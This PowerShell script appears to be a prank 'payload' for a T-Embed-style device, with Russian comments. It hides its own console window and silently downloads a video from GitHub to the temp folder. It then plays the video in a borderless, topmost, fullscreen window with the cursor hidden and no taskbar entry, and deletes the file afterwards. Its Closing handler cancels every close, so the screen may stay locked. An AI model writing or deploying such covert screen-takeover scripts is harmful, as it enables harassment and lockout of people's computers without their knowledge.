try {
    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# --- НАСТРОЙКИ ---
$u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/edit.mp4'
$f = "$env:TEMP\payload_video.mp4"
$videoDuration = 15  # ВПИШИ СЮДА ДЛИТЕЛЬНОСТЬ ВИДЕО В СЕКУНДАХ (например, 15)
# -----------------

try {
    Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop

    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    # Метод 1: Закрытие по событию (если сработает)
    $v.add_MediaEnded({ $w.Close() })
    
    # Метод 2: Закрытие по таймеру (гарантированное)
    $timer = New-Object System.Windows.Threading.DispatcherTimer
    $timer.Interval = [TimeSpan]::FromSeconds($videoDuration)
    $timer.Add_Tick({ $w.Close(); $timer.Stop() })
    $timer.Start()

    $w.Add_Closing({ $_.Cancel = $true })
    $w.ShowDialog() | Out-Null
} 
catch { exit }
finally {
    Start-Sleep -Seconds 1
    if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
}
